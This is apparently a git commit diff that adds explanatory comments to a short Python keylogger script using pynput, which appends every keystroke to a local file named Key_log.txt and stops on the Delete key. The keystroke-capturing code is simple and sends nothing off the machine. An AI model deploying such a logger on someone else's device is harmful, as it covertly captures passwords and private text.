f69a1761388ee3bc2beefcbd57dc1600079804c9
DoubleY <141092504+y44li@users.noreply.github.com>
2024-07-28 17:09:20 +0100

    Update simple Key Logger.py

--- simple Key Logger.py
+++ simple Key Logger.py
@@ -2,9 +2,9 @@ from pynput import keyboard
 
 
 
-def OnPress(key) : 
+def OnPress(key) : # Define the function for handling key presses
     
-
+ # Handle special keys
     if key == keyboard.Key.space:
         key = ' '
     if key == 'key.shift_r':
@@ -14,14 +14,14 @@ def OnPress(key) :
     elif key == keyboard.Key.enter:
         print ()
     elif key == keyboard.Key.delete : # Stop listener (you can choose what you want)
-        return False
+        return False   # Return False to terminate the listener
 
 
-
+# Write the pressed key to a log file
     with open("Key_log.txt", 'a') as file :
         file.write(f'Key Pressed: {key}\n')
     
-        
+# Create the keyboard listener with `on_press` handler       
 with keyboard.Listener (
     on_press = OnPress) as listener :
     listener.join()
